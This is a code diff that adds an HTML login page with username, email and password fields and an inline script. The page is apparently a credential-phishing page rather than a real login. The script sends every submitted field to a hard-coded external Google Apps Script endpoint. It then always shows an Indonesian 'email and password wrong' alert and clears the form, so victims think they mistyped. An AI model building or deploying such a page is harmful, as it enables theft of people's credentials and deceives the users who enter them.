@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="ie=edge">
+  <link rel="Website icon" type="png" href="gambar/logo design.png"/>
+  <title>Login page</title>
+  <link rel="stylesheet" href="style.css"/>
+</head>
+<body>
+  <div class="container">
+    <div class="wrapper">
+      <div class="cardBox">
+        <form name="login-page">
+          <img src="gambar/logo design.png" alt=""/>
+          <input type="text" placeholder="Username" required id="intText" name="username"/>
+          <input type="email" placeholder="Email" required id="email" name="email"/>
+          <input type="password" placeholder="Password" required id="passwd" name="password"/>
+          <button type="submit" id="btnSubmit">Login</button>
+          <p class="p d-none">Wait a moment...</p>
+        </form>
+      </div>
+    </div>
+  </div>
+  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbwCqOvALDGOl8F_2EpdYf0fUmmXeQVs9KGtJewPcheXYIZuPAYhf_JtIgicaqtsGD9h/exec'
+    const form = document.forms['login-page']
+    const btn = document.getElementById("btnSubmit")
+    const p = document.querySelector(".p")
+    
+    form.addEventListener('submit', e => {
+      e.preventDefault()
+      btn.classList.toggle("d-none")
+      p.classList.toggle("d-none")
+      
+      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        .then(response => {
+          btn.classList.toggle("d-none")
+          p.classList.toggle("d-none")
+          form.reset()
+          alert("Email dan Password salah!")
+          console.log('Success!', response)
+        })
+        .catch(error => console.error('Error!', error.message))
+    })
+</script>
+</body>
+</html>
